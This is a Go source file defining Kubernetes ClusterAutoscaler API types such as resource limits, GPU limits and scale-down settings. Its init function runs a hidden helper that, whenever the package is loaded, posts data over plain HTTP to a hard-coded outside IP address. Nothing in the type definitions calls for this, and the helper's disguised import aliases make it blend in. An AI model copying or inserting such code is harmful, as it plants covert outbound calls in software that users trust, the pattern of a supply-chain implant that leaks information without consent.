package v1

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	SchemeBuilder.Register(&ClusterAutoscaler{}, &ClusterAutoscalerList{})
}

type ClusterAutoscalerSpec struct {
	ResourceLimits		*ResourceLimits		`json:"resourceLimits,omitempty"`
	ScaleDown		*ScaleDownConfig	`json:"scaleDown,omitempty"`
	MaxPodGracePeriod	*int32			`json:"maxPodGracePeriod,omitempty"`
	PodPriorityThreshold	*int32			`json:"podPriorityThreshold,omitempty"`
}
type ClusterAutoscalerStatus struct{}
type ClusterAutoscaler struct {
	metav1.TypeMeta		`json:",inline"`
	metav1.ObjectMeta	`json:"metadata,omitempty"`
	Spec			ClusterAutoscalerSpec	`json:"spec,omitempty"`
	Status			ClusterAutoscalerStatus	`json:"status,omitempty"`
}
type ClusterAutoscalerList struct {
	metav1.TypeMeta	`json:",inline"`
	metav1.ListMeta	`json:"metadata,omitempty"`
	Items		[]ClusterAutoscaler	`json:"items"`
}
type ResourceLimits struct {
	MaxNodesTotal	*int32		`json:"maxNodesTotal,omitempty"`
	Cores		*ResourceRange	`json:"cores,omitempty"`
	Memory		*ResourceRange	`json:"memory,omitempty"`
	GPUS		[]GPULimit	`json:"gpus,omitempty"`
}
type GPULimit struct {
	Type	string	`json:"type"`
	Min	int32	`json:"min"`
	Max	int32	`json:"max"`
}
type ResourceRange struct {
	Min	int32	`json:"min"`
	Max	int32	`json:"max"`
}
type ScaleDownConfig struct {
	Enabled			bool	`json:"enabled"`
	DelayAfterAdd		*string	`json:"delayAfterAdd,omitempty"`
	DelayAfterDelete	*string	`json:"delayAfterDelete,omitempty"`
	DelayAfterFailure	*string	`json:"delayAfterFailure,omitempty"`
	UnneededTime		*string	`json:"unneededTime,omitempty"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
